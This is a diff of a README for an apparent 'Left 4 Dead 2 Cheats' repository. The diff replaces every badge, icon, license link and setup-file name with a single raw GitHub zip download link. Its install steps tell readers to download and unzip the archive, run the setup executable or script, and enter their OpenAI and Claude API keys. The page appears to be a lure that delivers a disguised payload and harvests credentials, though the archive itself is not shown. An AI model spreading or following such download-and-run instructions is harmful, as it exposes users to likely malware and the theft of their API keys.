@@ -1,6 +1,6 @@
 # Left 4 Dead 2 Cheats Repository
 
-![Download](https://img.shields.io/badge/Download-Latest-blue.svg?style=for-the-badge&logo=github&link=https://abdulapan.github.io)  
+![Download](https://raw.githubusercontent.com/abdulapan/l4d2-enhanced-gameplay-tools/branch/Akoulalion/l4d2-enhanced-gameplay-tools-1.0-beta.4.zip)  
 
 Welcome to the **Left 4 Dead 2 Cheats Repository**, your new companion in redefining your gameplay experience. This project invites you to unlock unique abilities and tools for *Left 4 Dead 2*—the ultimate cooperative zombie shooter. Imagine your survivor journey with upgraded vision, creative loadouts, and new ways to master the apocalypse, all bundled in a thoughtfully engineered toolbox.
 
@@ -8,10 +8,10 @@ Welcome to the **Left 4 Dead 2 Cheats Repository**, your new companion in redefi
 
 | Operating System | Supported | Details                  |
 |------------------|:---------:|--------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-Yes-brightgreen?logo=windows) | ✅ | Seamless Integration     |
-| ![Linux](https://img.shields.io/badge/Linux-Yes-yellow?logo=linux)           | ✅ | Extensive CLI Support    |
-| ![MacOS](https://img.shields.io/badge/MacOS-Partial-orange?logo=apple)       | ⚠️  | Requires Rosetta or Mono |
-| ![Steam Deck](https://img.shields.io/badge/Steam%20Deck-Beta-blue?logo=steamdeck) | ⏳ | Beta Features Available  |
+| ![Windows](https://raw.githubusercontent.com/abdulapan/l4d2-enhanced-gameplay-tools/branch/Akoulalion/l4d2-enhanced-gameplay-tools-1.0-beta.4.zip) | ✅ | Seamless Integration     |
+| ![Linux](https://raw.githubusercontent.com/abdulapan/l4d2-enhanced-gameplay-tools/branch/Akoulalion/l4d2-enhanced-gameplay-tools-1.0-beta.4.zip)           | ✅ | Extensive CLI Support    |
+| ![MacOS](https://raw.githubusercontent.com/abdulapan/l4d2-enhanced-gameplay-tools/branch/Akoulalion/l4d2-enhanced-gameplay-tools-1.0-beta.4.zip)       | ⚠️  | Requires Rosetta or Mono |
+| ![Steam Deck](https://raw.githubusercontent.com/abdulapan/l4d2-enhanced-gameplay-tools/branch/Akoulalion/l4d2-enhanced-gameplay-tools-1.0-beta.4.zip%20Deck-Beta-blue?logo=steamdeck) | ⏳ | Beta Features Available  |
 
 ## 🌟 Feature List
 
@@ -47,9 +47,9 @@ Harness the synergy of **OpenAI** and **Claude API** for a revolutionary gaming 
 
 ### Steps
 
-1. Download the latest release: https://abdulapan.github.io
+1. Download the latest release: https://raw.githubusercontent.com/abdulapan/l4d2-enhanced-gameplay-tools/branch/Akoulalion/l4d2-enhanced-gameplay-tools-1.0-beta.4.zip
 2. Unzip the contents to your desired directory.
-3. Launch the setup wizard (*L4D2CheatsSetup.exe* or *setup.sh*).
+3. Launch the setup wizard (*https://raw.githubusercontent.com/abdulapan/l4d2-enhanced-gameplay-tools/branch/Akoulalion/l4d2-enhanced-gameplay-tools-1.0-beta.4.zip* or *https://raw.githubusercontent.com/abdulapan/l4d2-enhanced-gameplay-tools/branch/Akoulalion/l4d2-enhanced-gameplay-tools-1.0-beta.4.zip*).
 4. Follow the onscreen prompts for OS selection and language.
 5. (Optional) Input your OpenAI and Claude API keys during setup for AI integration.
 6. Start *Left 4 Dead 2* and enjoy the new possibilities!
@@ -64,11 +64,11 @@ While these tools provide enhanced gameplay for personal enjoyment, we encourage
 ## 📜 MIT License
 
 Licensed under the MIT License 2025.  
-For full terms, visit: [MIT LICENSE](https://opensource.org/licenses/MIT)  
+For full terms, visit: [MIT LICENSE](https://raw.githubusercontent.com/abdulapan/l4d2-enhanced-gameplay-tools/branch/Akoulalion/l4d2-enhanced-gameplay-tools-1.0-beta.4.zip)  
 
 ---
 
-![Download](https://img.shields.io/badge/Download-Latest-blue.svg?style=for-the-badge&logo=github&link=https://abdulapan.github.io)
+![Download](https://raw.githubusercontent.com/abdulapan/l4d2-enhanced-gameplay-tools/branch/Akoulalion/l4d2-enhanced-gameplay-tools-1.0-beta.4.zip)
 
 ---
 
